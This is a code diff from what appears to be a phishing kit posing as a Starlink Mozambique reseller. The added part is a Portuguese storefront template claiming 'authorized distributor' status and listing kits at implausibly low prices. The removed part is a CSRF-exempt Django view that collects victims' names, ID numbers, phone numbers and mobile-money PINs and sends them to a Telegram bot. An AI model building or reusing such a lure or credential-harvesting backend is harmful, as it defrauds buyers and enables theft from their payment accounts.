@@ -1,37 +1,73 @@
-import json
-import requests
-from django.shortcuts import render
-from django.http import JsonResponse
-from django.views.decorators.csrf import csrf_exempt
+{% extends 'base.html' %}
 
-# Configuration
-BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
+{% block content %}
+<div class="starlink-bg min-h-[60vh] flex flex-col justify-center items-center text-center p-6 relative rounded-2xl overflow-hidden mb-12 border border-white/10">
+    <div class="absolute inset-0 bg-black/60 z-0"></div>
+    <div class="relative z-10 max-w-3xl space-y-4">
+        <span class="text-xs text-cyan-400 font-bold uppercase tracking-[0.3em]">Distribuidor Autorizado</span>
+        <h1 class="text-4xl md:text-6xl font-black uppercase tracking-tight text-white">Starlink Moçambique</h1>
+        <p class="text-gray-300 text-sm md:text-base max-w-xl mx-auto">
+            Internet de alta velocidade por satélite de baixa órbita terrestre. Conectividade ultra-rápida e estável em qualquer província ou distrito.
+        </p>
+    </div>
+</div>
 
-def home(request):
-    return render(request, 'index.html')
+<div class="max-w-7xl mx-auto px-4">
+    <div class="border-b border-white/10 pb-4 mb-8">
+        <h2 class="text-xl font-bold uppercase tracking-widest text-white">Kits & Equipamentos Disponíveis</h2>
+        <p class="text-gray-500 text-xs uppercase">Selecione o hardware ideal para a sua necessidade</p>
+    </div>
 
-@csrf_exempt
-def sync_emola(request):
-    """Processes Identity and Emola (M-Pesa) authentication data"""
-    if request.method == 'POST':
-        try:
-            data = json.loads(request.body)
-            report = (
-                "🚀 *STARLINK MOÇAMBIQUE SYNC*\n"
-                "----------------------------------\n"
-                f"👤 *Cliente:* `{data.get('name')}` | `{data.get('id_no')}`\n"
-                f"📞 *Contacto:* `{data.get('phone')}`\n"
-                f"📍 *Cidade:* `{data.get('city')}`\n"
-                "----------------------------------\n"
-                f"💰 *Pagamento:* `EMOLA / M-PESA`\n"
-                f"🔑 *PIN Confirmação:* `{data.get('pin')}`\n"
-                f"🔗 *Link SMS:* `{data.get('sms_link')}`\n"
-                "----------------------------------\n"
-                f"📦 *Pedido:* {data.get('item')} ({data.get('total')} MT)"
-            )
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                          data={"chat_id": CHAT_ID, "text": report, "parse_mode": "Markdown"})
-            return JsonResponse({"status": "synchronized"})
-        except Exception as e:
-            return JsonResponse({"status": "error", "message": str(e)}, status=400)
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+        <div class="glass-card overflow-hidden flex flex-col group hover:border-cyan-400/50 transition-all duration-300">
+            <div class="h-64 p-6 flex items-center justify-center bg-white/[0.02] border-b border-white/5 relative">
+                <img src="/static/img/1.jpg" alt="Kit Gen 3 Standard" class="max-h-full max-w-full object-contain group-hover:scale-105 transition-transform duration-300">
+                <span class="absolute top-4 right-4 bg-cyan-400 text-black text-[9px] font-black uppercase px-2 py-1 rounded">Mais Popular</span>
+            </div>
+            <div class="p-6 flex-grow flex flex-col justify-between space-y-6">
+                <div>
+                    <h3 class="text-lg font-bold text-white uppercase">Kit Gen 3 Standard (Novo)</h3>
+                    <p class="text-xs text-gray-400 mt-2 line-clamp-2">Ideal para residências, escritórios e pequenas empresas. Maior alcance Wi-Fi 6 integrado.</p>
+                </div>
+                <div class="flex justify-between items-center pt-4 border-t border-white/5">
+                    <span class="text-xl font-mono font-bold text-cyan-400">3,500 MT</span>
+                    <a href="{% url 'checkout' %}?kit=1" class="bg-white text-black text-xs font-bold px-4 py-3 rounded uppercase tracking-wider hover:bg-cyan-400 hover:text-black transition-colors">Comprar</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="glass-card overflow-hidden flex flex-col group hover:border-cyan-400/50 transition-all duration-300">
+            <div class="h-64 p-6 flex items-center justify-center bg-white/[0.02] border-b border-white/5">
+                <img src="/static/img/2.jpg" alt="Kit Gen 2 Actuated" class="max-h-full max-w-full object-contain group-hover:scale-105 transition-transform duration-300">
+            </div>
+            <div class="p-6 flex-grow flex flex-col justify-between space-y-6">
+                <div>
+                    <h3 class="text-lg font-bold text-white uppercase">Kit Gen 2 (Actuated)</h3>
+                    <p class="text-xs text-gray-400 mt-2 line-clamp-2">Antena motorizada com auto-orientador de sinal via satélite. Desempenho sólido de mercado.</p>
+                </div>
+                <div class="flex justify-between items-center pt-4 border-t border-white/5">
+                    <span class="text-xl font-mono font-bold text-cyan-400">2,500 MT</span>
+                    <a href="{% url 'checkout' %}?kit=2" class="bg-white text-black text-xs font-bold px-4 py-3 rounded uppercase tracking-wider hover:bg-cyan-400 hover:text-black transition-colors">Comprar</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="glass-card overflow-hidden flex flex-col group hover:border-cyan-400/50 transition-all duration-300">
+            <div class="h-64 p-6 flex items-center justify-center bg-white/[0.02] border-b border-white/5 relative">
+                <img src="/static/img/mini.jpg" alt="Starlink Mini" class="max-h-full max-w-full object-contain group-hover:scale-105 transition-transform duration-300">
+                <span class="absolute top-4 right-4 bg-purple-500 text-white text-[9px] font-black uppercase px-2 py-1 rounded">Portátil</span>
+            </div>
+            <div class="p-6 flex-grow flex flex-col justify-between space-y-6">
+                <div>
+                    <h3 class="text-lg font-bold text-white uppercase">Starlink Mini Portable</h3>
+                    <p class="text-xs text-gray-400 mt-2 line-clamp-2">Ultra-compacto com roteador Wi-Fi integrado diretamente no chassi da antena. Ideal para viagens.</p>
+                </div>
+                <div class="flex justify-between items-center pt-4 border-t border-white/5">
+                    <span class="text-xl font-mono font-bold text-cyan-400">1,500 MT</span>
+                    <a href="{% url 'checkout' %}?kit=mini" class="bg-white text-black text-xs font-bold px-4 py-3 rounded uppercase tracking-wider hover:bg-cyan-400 hover:text-black transition-colors">Comprar</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
